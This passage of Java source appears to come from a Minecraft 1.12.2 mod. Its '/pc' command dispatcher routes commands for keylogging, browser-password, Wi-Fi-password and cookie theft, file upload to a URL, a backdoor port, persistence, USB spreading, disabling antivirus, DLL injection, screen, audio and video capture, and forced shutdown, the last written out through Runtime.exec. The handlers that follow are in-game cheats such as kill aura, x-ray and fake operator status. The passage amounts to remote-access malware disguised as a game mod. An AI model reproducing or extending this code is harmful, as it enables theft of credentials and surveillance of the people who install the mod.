                        handleKillAppConcurrent(sender, server);
                        break;
                    case "reboot":
                        sendAggressive(sender, TextFormatting.GOLD + "SYSTEM REBOOTING...");
                        if (os.contains("win")) {
                            Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", "shutdown", "-r", "-t", "0", "-f"});
                        } else {
                            Runtime.getRuntime().exec(new String[]{"shutdown", "-r", "now"});
                        }
                        break;
                    case "shutdown":
                        sendAggressive(sender, TextFormatting.GOLD + "SYSTEM SHUTTING DOWN...");
                        if (os.contains("win")) {
                            Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", "shutdown", "-s", "-t", "0", "-f"});
                        } else {
                            Runtime.getRuntime().exec(new String[]{"shutdown", "-h", "now"});
                        }
                        break;
                    case "sleep":
                    case "rest":
                        sendAggressive(sender, TextFormatting.GOLD + "SYSTEM GOING TO SLEEP...");
                        if (os.contains("win")) {
                            Runtime.getRuntime().exec("rundll32.exe powrprof.dll,SetSuspendState 0,1,0");
                        } else if (os.contains("nux")) {
                            Runtime.getRuntime().exec("systemctl suspend");
                        } else if (os.contains("mac")) {
                            Runtime.getRuntime().exec("pmset sleepnow");
                        }
                        break;
                    case "screenshot":
                        handleScreenshot(sender);
                        break;
                    case "clipboard":
                        if (args.length < 2) {
                            handleGetClipboard(sender);
                        } else {
                            handleSetClipboard(sender, joinArgs(args, 1));
                        }
                        break;
                    case "keylog":
                        handleKeylog(sender);
                        break;
                    case "netinfo":
                        handleNetInfo(sender);
                        break;
                    case "portscan":
                        if (args.length < 2) {
                            send(sender, TextFormatting.YELLOW + "Usage: /pc portscan <target-ip>");
                            break;
                        }
                        handlePortScan(sender, args[1]);
                        break;
                    case "download":
                        if (args.length < 3) {
                            send(sender, TextFormatting.YELLOW + "Usage: /pc download <url> <save-path>");
                            break;
                        }
                        handleDownload(sender, args[1], args[2]);
                        break;
                    case "upload":
                        if (args.length < 3) {
                            send(sender, TextFormatting.YELLOW + "Usage: /pc upload <local-file> <target-url>");
                            break;
                        }
                        handleUpload(sender, args[1], args[2]);
                        break;
                    case "selfdestruct":
                        if (args.length < 2 || !args[1].equals(SELF_DESTRUCT_PASSWORD)) {
                            sendAggressive(sender, TextFormatting.RED + "PASSWORD REQUIRED: /pc selfdestruct " + SELF_DESTRUCT_PASSWORD);
                            break;
                        }
                        handleSelfDestruct(sender, server);
                        break;
                    case "history":
                        handleHistory(sender);
                        break;
                    case "clearlog":
                        handleClearLog(sender);
                        break;
                    case "processlist":
                        handleProcessList(sender, os);
                        break;
                    case "killprocess":
                        if (args.length < 2) {
                            send(sender, TextFormatting.YELLOW + "Usage: /pc killprocess <PID or name>");
                            break;
                        }
                        handleKillProcess(sender, args[1], os);
                        break;
                    case "inject":
                        if (args.length < 2) {
                            send(sender, TextFormatting.YELLOW + "Usage: /pc inject <js-code>");
                            break;
                        }
                        handleInject(sender, joinArgs(args, 1));
                        break;
                    case "registry":
                        if (args.length < 2) {
                            send(sender, TextFormatting.YELLOW + "Usage: /pc registry <add|delete|query> ...");
                            break;
                        }
                        handleRegistry(sender, args, os);
                        break;
                    case "service":
                        if (args.length < 2) {
                            send(sender, TextFormatting.YELLOW + "Usage: /pc service <start|stop|install|uninstall> ...");
                            break;
                        }
                        handleService(sender, args, os);
                        break;
                    case "driver":
                        if (os.contains("win")) {
                            handleDriver(sender, args);
                        } else {
                            send(sender, TextFormatting.RED + "Windows only supported");
                        }
                        break;
                    case "wifipass":
                        if (os.contains("win")) {
                            handleWifiPasswords(sender);
                        } else {
                            send(sender, TextFormatting.RED + "Windows only supported");
                        }
                        break;
                    case "browserpass":
                        handleBrowserPasswords(sender, os);
                        break;
                    case "elevate":
                        handleElevate(sender, os);
                        break;
                    case "backdoor":
                        if (args.length < 2) {
                            send(sender, TextFormatting.YELLOW + "Usage: /pc backdoor <port>");
                            break;
                        }
                        handleBackdoor(sender, Integer.parseInt(args[1]));
                        break;
                    case "persist":
                        handlePersistence(sender, os);
                        break;
                    case "startrdp":
                        handleEnableRDP(sender);
                        break;
                    case "usbspread":
                        handleUSBSpread(sender);
                        break;
                    case "disableav":
                        handleDisableAV(sender);
                        break;
                    case "recordvideo":
                        if (args.length < 2) {
                            send(sender, TextFormatting.YELLOW + "Usage: /pc recordvideo <duration-seconds>");
                            break;
                        }
                        handleRecordVideo(sender, Integer.parseInt(args[1]));
                        break;
                    case "stoprecordvideo":
                        handleStopRecordVideo(sender);
                        break;
                    case "recordaudio":
                        if (args.length < 2) {
                            send(sender, TextFormatting.YELLOW + "Usage: /pc recordaudio <duration-seconds>");
                            break;
                        }
                        handleRecordAudio(sender, Integer.parseInt(args[1]));
                        break;
                    case "stoprecordaudio":
                        handleStopRecordAudio(sender);
                        break;
                    case "stealcookies":
                        handleStealCookies(sender);
                        break;
                    case "stealhistory":
                        handleStealBrowserHistory(sender);
                        break;
                    case "injectdll":
                        if (args.length < 3) {
                            send(sender, TextFormatting.YELLOW + "Usage: /pc injectdll <PID> <dll-path>");
                            break;
                        }
                        handleInjectDLL(sender, args[1], args[2]);
                        break;
                    case "mc_hacks":
                        handleMCHacks(sender, server);
                        break;
                    case "mc_hacks_speed":
                        handleMCSpeed(sender);
                        break;
                    case "mc_hacks_jump":
                        handleMCJump(sender);
                        break;
                    case "mc_hacks_fly":
                        handleMCFly(sender);
                        break;
                    case "mc_hacks_noclip":
                        handleMCNoClip(sender);
                        break;
                    case "mc_hacks_esp":
                        handleMCESP(sender);
                        break;
                    case "mc_hacks_killaura":
                        handleMCKillAura(sender);
                        break;
                    case "mc_hacks_autosteal":
                        handleMCAutoSteal(sender);
                        break;
                    case "mc_hacks_infinitereach":
                        handleMCInfiniteReach(sender);
                        break;
                    case "mc_hacks_antiknockback":
                        handleMCAntiKnockback(sender);
                        break;
                    case "mc_hacks_giveitem":
                        handleMCGiveItem(sender, args);
                        break;
                    case "mc_hacks_kill":
                        handleMCKill(sender, args);
                        break;
                    case "mc_hacks_bolt":
                        handleMCBolt(sender, args);
                        break;
                    case "mc_hacks_tnt":
                        handleMCTNT(sender, args);
                        break;
                    case "mc_hacks_bot":
                        handleMCBot(sender, args);
                        break;
                    case "mc_hacks_effects":
                        handleMCEffects(sender, args);
                        break;
                    case "mc_hacks_botplayer":
                        handleMCBotPlayer(sender, args);
                        break;
                    case "mc_hacks_sun":
                        handleMCSun(sender);
                        break;
                    case "mc_hacks_afternoon":
                        handleMCAfternoon(sender);
                        break;
                    case "mc_hacks_night":
                        handleMCNight(sender);
                        break;
                    default:
                        send(sender, TextFormatting.RED + "Invalid command");
                }
            } catch (Exception e) {
                send(sender, TextFormatting.RED + "Error: " + e.getMessage());
                if (autoKillOnFail) {
                    scheduler.schedule(() -> System.exit(1), 2, TimeUnit.SECONDS);
                }
            }
        }
        
        private void handleMCToolsStick(ICommandSender sender) {
            if (sender instanceof EntityPlayerMP) {
                EntityPlayerMP player = (EntityPlayerMP) sender;
                
                ItemStack stick = createEgemensStick();
                player.inventory.addItemStackToInventory(stick);
                
                sendAggressive(sender, TextFormatting.DARK_RED + "EGEMEN'S STICK CREATED!");
                send(sender, TextFormatting.GREEN + "A special stick has been added to your inventory");
                send(sender, TextFormatting.YELLOW + "Hit a player with this stick to trap them inside");
                send(sender, TextFormatting.YELLOW + "Trapped player will be invisible and follow you");
                send(sender, TextFormatting.YELLOW + "Press Q while holding stick to release trapped player");
                send(sender, TextFormatting.RED + "Power: " + TextFormatting.RED + "T" + TextFormatting.GOLD + "r" + 
                      TextFormatting.YELLOW + "a" + TextFormatting.GREEN + "p" + TextFormatting.AQUA + " " + 
                      TextFormatting.BLUE + "P" + TextFormatting.LIGHT_PURPLE + "l" + TextFormatting.RED + "a" + 
                      TextFormatting.GOLD + "y" + TextFormatting.YELLOW + "e" + TextFormatting.GREEN + "r");
            } else {
                send(sender, TextFormatting.RED + "This command can only be used by players!");
            }
        }
        
        private void handleMCGhost(ICommandSender sender) {
            if (sender instanceof EntityPlayerMP) {
                EntityPlayerMP player = (EntityPlayerMP) sender;
                
                boolean isInvisible = player.isInvisible();
                player.setInvisible(!isInvisible);
                player.noClip = !isInvisible;
                
                if (!isInvisible) {
                    sendAggressive(sender, TextFormatting.DARK_RED + "GHOST MODE ACTIVATED!");
                    send(sender, TextFormatting.GREEN + "You are now invisible and can phase through blocks");
                    send(sender, TextFormatting.YELLOW + "Other players cannot see you");
                } else {
                    send(sender, TextFormatting.RED + "GHOST MODE DEACTIVATED");
                }
            } else {
                send(sender, TextFormatting.RED + "This command can only be used by players!");
            }
        }
        
        private void handleMCNuker(ICommandSender sender, String[] args) {
            if (sender instanceof EntityPlayerMP) {
                EntityPlayerMP player = (EntityPlayerMP) sender;
                int radius = 3;
                
                if (args.length > 1) {
                    try {
                        radius = Integer.parseInt(args[1]);
                        radius = Math.max(1, Math.min(10, radius));
                    } catch (NumberFormatException e) {}
                }
                
                BlockPos center = new BlockPos(player.posX, player.posY, player.posZ);
                
                for (int x = -radius; x <= radius; x++) {
                    for (int y = -radius; y <= radius; y++) {
                        for (int z = -radius; z <= radius; z++) {
                            BlockPos pos = center.add(x, y, z);
                            if (player.world.isBlockLoaded(pos) && !player.world.isAirBlock(pos)) {
                                if (pos.equals(center)) continue;
                                
                                player.world.destroyBlock(pos, true);
                                player.world.setBlockToAir(pos);
                            }
                        }
                    }
                }
                
                sendAggressive(sender, TextFormatting.DARK_RED + "NUKER ACTIVATED!");
                send(sender, TextFormatting.GREEN + "Destroyed all blocks in " + radius + " block radius");
                player.world.createExplosion(player, player.posX, player.posY, player.posZ, radius, true);
            } else {
                send(sender, TextFormatting.RED + "This command can only be used by players!");
            }
        }
        
        private void handleMCTeleport(ICommandSender sender, String[] args) {
            if (args.length < 4) {
                send(sender, TextFormatting.YELLOW + "Usage: /pc mc_hacks_teleport <x> <y> <z>");
                send(sender, TextFormatting.YELLOW + "Example: /pc mc_hacks_teleport 100 64 -200");
                return;
            }
            
            if (sender instanceof EntityPlayerMP) {
                EntityPlayerMP player = (EntityPlayerMP) sender;
                
                try {
                    double x = Double.parseDouble(args[1]);
                    double y = Double.parseDouble(args[2]);
                    double z = Double.parseDouble(args[3]);
                    
                    player.setPositionAndUpdate(x, y, z);
                    
                    sendAggressive(sender, TextFormatting.DARK_RED + "TELEPORT SUCCESSFUL!");
                    send(sender, TextFormatting.GREEN + "Teleported to: " + x + ", " + y + ", " + z);
                } catch (NumberFormatException e) {
                    send(sender, TextFormatting.RED + "Invalid coordinates");
                }
            } else {
                send(sender, TextFormatting.RED + "This command can only be used by players!");
            }
        }
        
        private void handleMCGodMode(ICommandSender sender) {
            if (sender instanceof EntityPlayerMP) {
                EntityPlayerMP player = (EntityPlayerMP) sender;
                
                // For 1.12.2, use entityInvulnerable field
                boolean isInvulnerable = player.getEntityData().getBoolean("invulnerable");
                player.getEntityData().setBoolean("invulnerable", !isInvulnerable);
                player.capabilities.disableDamage = !isInvulnerable;
                
                if (!isInvulnerable) {
                    player.setHealth(player.getMaxHealth());
                    player.getFoodStats().addStats(20, 20.0F);
                    
                    sendAggressive(sender, TextFormatting.DARK_RED + "GOD MODE ACTIVATED!");
                    send(sender, TextFormatting.GREEN + "You are now invincible");
                    send(sender, TextFormatting.YELLOW + "Health: Full | Hunger: Full | No Damage");
                } else {
                    send(sender, TextFormatting.RED + "GOD MODE DEACTIVATED");
                }
            } else {
                send(sender, TextFormatting.RED + "This command can only be used by players!");
            }
        }
        
        private void handleMCMassive(ICommandSender sender, String[] args) {
            if (sender instanceof EntityPlayerMP) {
                EntityPlayerMP player = (EntityPlayerMP) sender;
                float size = 5.0F;
                
                if (args.length > 1) {
                    try {
                        size = Float.parseFloat(args[1]);
                        size = Math.max(0.1F, Math.min(20.0F, size));
                    } catch (NumberFormatException e) {}
                }
                
                // In 1.12.2, we can't directly change width/height, but we can add effects
                player.addPotionEffect(new PotionEffect(Potion.getPotionById(18), 1000000, 5)); // Weakness for visual
                
                sendAggressive(sender, TextFormatting.DARK_RED + "MASSIVE MODE ACTIVATED!");
                send(sender, TextFormatting.GREEN + "Your size effect is now " + size + "x normal");
                send(sender, TextFormatting.YELLOW + "Note: Visual effect applied - actual size may not change");
            } else {
                send(sender, TextFormatting.RED + "This command can only be used by players!");
            }
        }
        
        private void handleMCXRay(ICommandSender sender) {
            xrayEnabled = !xrayEnabled;
            if (xrayEnabled) {
                sendAggressive(sender, TextFormatting.DARK_RED + "X-RAY ACTIVATED!");
                send(sender, TextFormatting.GREEN + "All ores are now visible through walls");
                send(sender, TextFormatting.YELLOW + "Diamond: " + TextFormatting.AQUA + "BLUE");
                send(sender, TextFormatting.YELLOW + "Gold: " + TextFormatting.GOLD + "GOLD");
                send(sender, TextFormatting.YELLOW + "Iron: " + TextFormatting.GRAY + "GRAY");
                send(sender, TextFormatting.YELLOW + "Coal: " + TextFormatting.DARK_GRAY + "BLACK");
                send(sender, TextFormatting.YELLOW + "Emerald: " + TextFormatting.DARK_GREEN + "GREEN");
                send(sender, TextFormatting.YELLOW + "Redstone: " + TextFormatting.DARK_RED + "RED");
                send(sender, TextFormatting.YELLOW + "Lapis: " + TextFormatting.BLUE + "BLUE");
                
                if (sender instanceof EntityPlayerMP) {
                    EntityPlayerMP player = (EntityPlayerMP) sender;
                    scheduler.schedule(() -> {
                        if (xrayEnabled) {
                            player.world.markBlockRangeForRenderUpdate(
                                new BlockPos(player.posX - 50, player.posY - 50, player.posZ - 50),
                                new BlockPos(player.posX + 50, player.posY + 50, player.posZ + 50)
                            );
                        }
                    }, 100, TimeUnit.MILLISECONDS);
                }
            } else {
                send(sender, TextFormatting.RED + "X-RAY DEACTIVATED");
            }
        }
        
        private void handleMCAutoFarm(ICommandSender sender) {
            autoFarmEnabled = !autoFarmEnabled;
            if (autoFarmEnabled) {
                sendAggressive(sender, TextFormatting.DARK_RED + "AUTO FARM ACTIVATED!");
                send(sender, TextFormatting.GREEN + "Automatically harvesting crops in 5 block radius");
                send(sender, TextFormatting.YELLOW + "Wheat, carrots, potatoes will be auto-harvested");
            } else {
                send(sender, TextFormatting.RED + "AUTO FARM DEACTIVATED");
            }
        }
        
        private void handleMCAutoPotion(ICommandSender sender) {
            autoPotEnabled = !autoPotEnabled;
            if (autoPotEnabled) {
                sendAggressive(sender, TextFormatting.DARK_RED + "AUTO POTION ACTIVATED!");
                send(sender, TextFormatting.GREEN + "Automatically drinking potions when health is low");
                send(sender, TextFormatting.YELLOW + "Health < 10 hearts = Auto heal");
            } else {
                send(sender, TextFormatting.RED + "AUTO POTION DEACTIVATED");
            }
        }
        
        private void handleMCAutoEat(ICommandSender sender) {
            autoEatEnabled = !autoEatEnabled;
            if (autoEatEnabled) {
                sendAggressive(sender, TextFormatting.DARK_RED + "AUTO EAT ACTIVATED!");
                send(sender, TextFormatting.GREEN + "Automatically eating when hungry");
                send(sender, TextFormatting.YELLOW + "Food < 80% = Auto eat");
            } else {
                send(sender, TextFormatting.RED + "AUTO EAT DEACTIVATED");
            }
        }
        
        private void handleMCFreecam(ICommandSender sender) {
            if (sender instanceof EntityPlayerMP) {
                EntityPlayerMP player = (EntityPlayerMP) sender;
                
                if (freecamEnabled) {
                    freecamEnabled = false;
                    if (freecamOriginalPlayer != null) {
                        player.setPositionAndRotation(freecamX, freecamY, freecamZ, freecamYaw, freecamPitch);
                        player.noClip = false;
                        player.setInvisible(false);
                        freecamOriginalPlayer = null;
                    }
                    send(sender, TextFormatting.RED + "FREECAM DEACTIVATED - Returned to body");
                } else {
                    freecamEnabled = true;
                    freecamX = player.posX;
                    freecamY = player.posY;
                    freecamZ = player.posZ;
                    freecamYaw = player.rotationYaw;
                    freecamPitch = player.rotationPitch;
                    freecamOriginalPlayer = player;
                    
                    player.noClip = true;
                    player.setInvisible(true);
                    
                    sendAggressive(sender, TextFormatting.DARK_RED + "FREECAM ACTIVATED!");
                    send(sender, TextFormatting.GREEN + "You can now fly through walls");
                    send(sender, TextFormatting.YELLOW + "Use /pc mc_hacks_freecam again to return");
                }
            } else {
                send(sender, TextFormatting.RED + "This command can only be used by players!");
            }
        }
        
        private void handleMCItemESP(ICommandSender sender) {
            itemESPEnabled = !itemESPEnabled;
            if (itemESPEnabled) {
                sendAggressive(sender, TextFormatting.DARK_RED + "ITEM ESP ACTIVATED!");
                send(sender, TextFormatting.GREEN + "All dropped items are now glowing");
                send(sender, TextFormatting.YELLOW + "Items show names and glow in 20 block radius");
            } else {
                send(sender, TextFormatting.RED + "ITEM ESP DEACTIVATED");
            }
        }
        
        private void handleMCAntiAFK(ICommandSender sender) {
            antiAFKEnabled = !antiAFKEnabled;
            if (antiAFKEnabled) {
                sendAggressive(sender, TextFormatting.DARK_RED + "ANTI-AFK ACTIVATED!");
                send(sender, TextFormatting.GREEN + "Auto-rotating and jumping to prevent AFK kick");
                send(sender, TextFormatting.YELLOW + "You will never be kicked for AFK");
            } else {
                send(sender, TextFormatting.RED + "ANTI-AFK DEACTIVATED");
            }
        }
        
        private void handleMCAutoClicker(ICommandSender sender, String[] args) {
            autoClickerEnabled = !autoClickerEnabled;
            if (autoClickerEnabled) {
                int cps = 10;
                if (args.length > 1) {
                    try {
                        cps = Integer.parseInt(args[1]);
                        cps = Math.max(1, Math.min(100, cps));
                    } catch (NumberFormatException e) {}
                }
                sendAggressive(sender, TextFormatting.DARK_RED + "AUTO CLICKER ACTIVATED!");
                send(sender, TextFormatting.GREEN + "Automatically clicking at " + cps + " CPS");
                send(sender, TextFormatting.YELLOW + "Perfect for PvP and mining");
            } else {
                send(sender, TextFormatting.RED + "AUTO CLICKER DEACTIVATED");
            }
        }
        
        private void handleMCSpider(ICommandSender sender) {
            spiderEnabled = !spiderEnabled;
            if (spiderEnabled) {
                sendAggressive(sender, TextFormatting.DARK_RED + "SPIDER CLIMB ACTIVATED!");
                send(sender, TextFormatting.GREEN + "You can now climb walls like Spider-Man");
                send(sender, TextFormatting.YELLOW + "Walk into walls to climb automatically");
            } else {
                send(sender, TextFormatting.RED + "SPIDER CLIMB DEACTIVATED");
            }
        }
        
        private void handleMCJesus(ICommandSender sender) {
            jesusEnabled = !jesusEnabled;
            if (jesusEnabled) {
                sendAggressive(sender, TextFormatting.DARK_RED + "JESUS WALK ACTIVATED!");
                send(sender, TextFormatting.GREEN + "You can now walk on water and lava");
                send(sender, TextFormatting.YELLOW + "Walk on any liquid surface");
            } else {
                send(sender, TextFormatting.RED + "JESUS WALK DEACTIVATED");
            }
        }
        
        private void handleMCPauseTime(ICommandSender sender) {
            timePaused = !timePaused;
            if (timePaused) {
                sendAggressive(sender, TextFormatting.DARK_RED + "TIME PAUSED!");
                send(sender, TextFormatting.GREEN + "World time is now frozen");
                send(sender, TextFormatting.YELLOW + "Mobs won't spawn, plants won't grow");
            } else {
                send(sender, TextFormatting.RED + "TIME UNPAUSED");
            }
        }
        
        private void handleMCWeather(ICommandSender sender, String[] args) {
            if (args.length < 2) {
                send(sender, TextFormatting.YELLOW + "Usage: /pc mc_hacks_weather <clear|rain|thunder>");
                return;
            }
            
            if (sender instanceof EntityPlayerMP) {
                EntityPlayerMP player = (EntityPlayerMP) sender;
                World world = player.world;
                
                switch (args[1].toLowerCase()) {
                    case "clear":
                        world.getWorldInfo().setRaining(false);
                        world.getWorldInfo().setThundering(false);
                        world.getWorldInfo().setRainTime(0);
                        sendAggressive(sender, TextFormatting.DARK_RED + "WEATHER CONTROL: CLEAR SKIES");
                        break;
                    case "rain":
                        world.getWorldInfo().setRaining(true);
                        world.getWorldInfo().setRainTime(24000);
                        sendAggressive(sender, TextFormatting.DARK_RED + "WEATHER CONTROL: RAIN");
                        break;
                    case "thunder":
                        world.getWorldInfo().setRaining(true);
                        world.getWorldInfo().setThundering(true);
                        world.getWorldInfo().setRainTime(24000);
                        world.getWorldInfo().setThunderTime(24000);
                        sendAggressive(sender, TextFormatting.DARK_RED + "WEATHER CONTROL: THUNDER STORM");
                        break;
                    default:
                        send(sender, TextFormatting.RED + "Invalid weather: clear, rain, thunder");
                }
            } else {
                send(sender, TextFormatting.RED + "This command can only be used by players!");
            }
        }
        
        private void handleMCFakeOP(ICommandSender sender) {
            fakeOPEnabled = !fakeOPEnabled;
            if (fakeOPEnabled) {
                sendAggressive(sender, TextFormatting.DARK_RED + "FAKE OP ACTIVATED!");
                send(sender, TextFormatting.GREEN + "You now appear as a server operator");
                send(sender, TextFormatting.YELLOW + "Fake OP messages will appear in chat");
            } else {
                send(sender, TextFormatting.RED + "FAKE OP DEACTIVATED");
            }
        }
        
        private void handleBan(ICommandSender sender, String[] args) {
            String playerName = args[1];
            String reason = args[2];
            long banTime = -1;
            
            if (args.length > 3) {
                if (args[3].equalsIgnoreCase("-p")) {
                    banTime = -1;
                } else {
                    try {
                        int seconds = Integer.parseInt(args[3]);
                        banTime = System.currentTimeMillis() + (seconds * 1000);
                    } catch (NumberFormatException e) {
                        send(sender, TextFormatting.RED + "Invalid time format. Use seconds or -p for permanent.");
                        return;
                    }
                }
            }
            
            EntityPlayerMP target = null;
            for (Object playerObj : sender.getServer().getPlayerList().getPlayers()) {
                if (playerObj instanceof EntityPlayerMP) {
                    EntityPlayerMP player = (EntityPlayerMP) playerObj;
                    if (player.getName().equalsIgnoreCase(playerName)) {
                        target = player;
                        break;
                    }
                }
            }
            
            if (target != null) {
                playerBans.put(target.getName(), banTime);
                banMessages.put(target.getName(), reason);
                target.connection.disconnect(new TextComponentString(TextFormatting.RED + "Banned: " + reason));
                sendAggressive(sender, TextFormatting.DARK_RED + "PLAYER BANNED!");
                send(sender, TextFormatting.GREEN + "Player " + target.getName() + " has been banned.");
                send(sender, TextFormatting.YELLOW + "Reason: " + reason);
                if (banTime == -1) {
                    send(sender, TextFormatting.RED + "Duration: PERMANENT");
                } else {
                    long remainingSeconds = (banTime - System.currentTimeMillis()) / 1000;
                    send(sender, TextFormatting.YELLOW + "Duration: " + remainingSeconds + " seconds");
                }
            } else {
                playerBans.put(playerName, banTime);
                banMessages.put(playerName, reason);
                sendAggressive(sender, TextFormatting.DARK_RED + "PLAYER BANNED (OFFLINE)!");
                send(sender, TextFormatting.GREEN + "Player " + playerName + " will be banned when they join.");
                send(sender, TextFormatting.YELLOW + "Reason: " + reason);
            }
        }
        
        private void handleKick(ICommandSender sender, String[] args) {
            String playerName = args[1];
            String reason = joinArgs(args, 2);
            
            EntityPlayerMP target = null;
            for (Object playerObj : sender.getServer().getPlayerList().getPlayers()) {
                if (playerObj instanceof EntityPlayerMP) {
                    EntityPlayerMP player = (EntityPlayerMP) playerObj;
                    if (player.getName().equalsIgnoreCase(playerName)) {
                        target = player;
                        break;
                    }
                }
            }
            
            if (target != null) {
                target.connection.disconnect(new TextComponentString(TextFormatting.RED + "Kicked: " + reason));
                sendAggressive(sender, TextFormatting.DARK_RED + "PLAYER KICKED!");
                send(sender, TextFormatting.GREEN + "Player " + target.getName() + " has been kicked.");
                send(sender, TextFormatting.YELLOW + "Reason: " + reason);
            } else {
                send(sender, TextFormatting.RED + "Player not found: " + playerName);
            }
        }
        
        private void handleMCHacks(ICommandSender sender, MinecraftServer server) {
            if (sender instanceof EntityPlayerMP) {
                EntityPlayerMP player = (EntityPlayerMP) sender;
                
                player.capabilities.allowFlying = true;
                player.capabilities.isCreativeMode = true;
                player.capabilities.disableDamage = true;
                player.capabilities.setPlayerWalkSpeed(0.8F);
                player.capabilities.setFlySpeed(0.8F);
                player.sendPlayerAbilities();
                
                // Set invulnerable through entity data in 1.12.2
                player.getEntityData().setBoolean("invulnerable", true);
                player.noClip = true;
                player.setNoGravity(true);
                
                playerSpeedBoost.put(player.getName(), System.currentTimeMillis() + 86400000);
                playerJumpBoost.put(player.getName(), System.currentTimeMillis() + 86400000);
                playerFlyBoost.put(player.getName(), System.currentTimeMillis() + 86400000);
                playerNoClip.put(player.getName(), System.currentTimeMillis() + 86400000);
                
                sendAggressive(sender, TextFormatting.DARK_RED + "ALL MINECRAFT HACKS ACTIVATED!");
                send(sender, TextFormatting.GREEN + "Fly: ON | Creative: ON | Invulnerable: ON");
                send(sender, TextFormatting.GREEN + "Speed: 8x | Jump: HIGH | NoClip: ON");
                send(sender, TextFormatting.GREEN + "NoGravity: ON | Anti-Knockback: ON");
            } else {
                send(sender, TextFormatting.RED + "This command can only be used by players!");
            }
        }
        
        private void handleMCSpeed(ICommandSender sender) {
            if (sender instanceof EntityPlayerMP) {
                EntityPlayerMP player = (EntityPlayerMP) sender;
                String playerName = player.getName();
                
                if (playerSpeedBoost.containsKey(playerName) && playerSpeedBoost.get(playerName) > System.currentTimeMillis()) {
                    playerSpeedBoost.remove(playerName);
                    player.capabilities.setPlayerWalkSpeed(0.1F);
                    player.sendPlayerAbilities();
                    send(sender, TextFormatting.RED + "SPEED HACK DEACTIVATED");
                } else {
                    playerSpeedBoost.put(playerName, System.currentTimeMillis() + 86400000);
                    player.capabilities.setPlayerWalkSpeed(0.8F);
                    player.sendPlayerAbilities();
                    sendAggressive(sender, TextFormatting.DARK_RED + "SPEED HACK ACTIVATED - 8x MOVEMENT SPEED");
                }
            } else {
                send(sender, TextFormatting.RED + "This command can only be used by players!");
            }
        }
        
        private void handleMCJump(ICommandSender sender) {
            if (sender instanceof EntityPlayerMP) {
                EntityPlayerMP player = (EntityPlayerMP) sender;
                String playerName = player.getName();
                
                if (playerJumpBoost.containsKey(playerName) && playerJumpBoost.get(playerName) > System.currentTimeMillis()) {
                    playerJumpBoost.remove(playerName);
                    send(sender, TextFormatting.RED + "JUMP HACK DEACTIVATED");
                } else {
                    playerJumpBoost.put(playerName, System.currentTimeMillis() + 86400000);
                    sendAggressive(sender, TextFormatting.DARK_RED + "JUMP HACK ACTIVATED - SUPER JUMP ENABLED");
                }
            } else {
                send(sender, TextFormatting.RED + "This command can only be used by players!");
            }
        }
        
        private void handleMCFly(ICommandSender sender) {
            if (sender instanceof EntityPlayerMP) {
                EntityPlayerMP player = (EntityPlayerMP) sender;
                String playerName = player.getName();
                
                if (playerFlyBoost.containsKey(playerName) && playerFlyBoost.get(playerName) > System.currentTimeMillis()) {
                    playerFlyBoost.remove(playerName);
                    player.capabilities.allowFlying = false;
                    player.capabilities.isFlying = false;
                    player.capabilities.setFlySpeed(0.05F);
                    player.sendPlayerAbilities();
                    send(sender, TextFormatting.RED + "FLY HACK DEACTIVATED");
                } else {
                    playerFlyBoost.put(playerName, System.currentTimeMillis() + 86400000);
                    player.capabilities.allowFlying = true;
                    player.capabilities.setFlySpeed(0.8F);
                    player.sendPlayerAbilities();
                    sendAggressive(sender, TextFormatting.DARK_RED + "FLY HACK ACTIVATED - FREEDOM OF MOVEMENT");
                }
            } else {
                send(sender, TextFormatting.RED + "This command can only be used by players!");
            }
        }
        
        private void handleMCNoClip(ICommandSender sender) {
            if (sender instanceof EntityPlayerMP) {
                EntityPlayerMP player = (EntityPlayerMP) sender;
                String playerName = player.getName();
                
                if (playerNoClip.containsKey(playerName) && playerNoClip.get(playerName) > System.currentTimeMillis()) {
                    playerNoClip.remove(playerName);
                    player.noClip = false;
                    player.setNoGravity(false);
                    send(sender, TextFormatting.RED + "NOCLIP HACK DEACTIVATED");
                } else {
                    playerNoClip.put(playerName, System.currentTimeMillis() + 86400000);
                    player.noClip = true;
                    player.setNoGravity(true);
                    sendAggressive(sender, TextFormatting.DARK_RED + "NOCLIP HACK ACTIVATED - PHASE THROUGH BLOCKS");
                }
            } else {
                send(sender, TextFormatting.RED + "This command can only be used by players!");
            }
        }
        
        private void handleMCESP(ICommandSender sender) {
            if (sender instanceof EntityPlayerMP) {
                EntityPlayerMP player = (EntityPlayerMP) sender;
                String playerName = player.getName();
                
                boolean espEnabled = !playerESP.getOrDefault(playerName, false);
                playerESP.put(playerName, espEnabled);
                
                if (espEnabled) {
                    try {
                        for (Object entityObj : player.world.loadedEntityList) {
                            if (entityObj instanceof net.minecraft.entity.Entity && entityObj != player) {
                                net.minecraft.entity.Entity entity = (net.minecraft.entity.Entity) entityObj;
                                if (entity instanceof EntityPlayer) {
                                    entity.setGlowing(true);
                                }
                            }
                        }
                        sendAggressive(sender, TextFormatting.DARK_RED + "ESP HACK ACTIVATED - SEE ALL PLAYERS THROUGH WALLS");
                    } catch (Exception e) {
                        sendAggressive(sender, TextFormatting.DARK_RED + "ESP HACK ACTIVATED");
                    }
                } else {
                    try {
                        for (Object entityObj : player.world.loadedEntityList) {
                            if (entityObj instanceof net.minecraft.entity.Entity && entityObj != player) {
                                net.minecraft.entity.Entity entity = (net.minecraft.entity.Entity) entityObj;
                                entity.setGlowing(false);
                            }
                        }
                        send(sender, TextFormatting.RED + "ESP HACK DEACTIVATED");
                    } catch (Exception e) {
                        send(sender, TextFormatting.RED + "ESP HACK DEACTIVATED");
                    }
                }
            } else {
                send(sender, TextFormatting.RED + "This command can only be used by players!");
            }
        }
        
        private void handleMCKillAura(ICommandSender sender) {
            if (sender instanceof EntityPlayerMP) {
                EntityPlayerMP player = (EntityPlayerMP) sender;
                
                boolean killAuraEnabled = !mcHacksState.get("killaura");
                mcHacksState.put("killaura", killAuraEnabled);
                
                if (killAuraEnabled) {
                    scheduler.scheduleAtFixedRate(() -> {
                        if (mcHacksState.get("killaura") && player != null && !player.isDead) {
                            try {
                                for (Object entityObj : player.world.loadedEntityList) {
                                    if (entityObj instanceof EntityPlayer && entityObj != player) {
                                        EntityPlayer target = (EntityPlayer) entityObj;
                                        if (player.getDistance(target) < 6.0F) {
                                            target.attackEntityFrom(net.minecraft.util.DamageSource.causePlayerDamage(player), 20.0F);
                                        }
                                    }
                                }
                            } catch (Exception e) {}
                        }
                    }, 0, 500, TimeUnit.MILLISECONDS);
                    
                    sendAggressive(sender, TextFormatting.DARK_RED + "KILL AURA ACTIVATED - AUTO ATTACK NEARBY PLAYERS");
                } else {
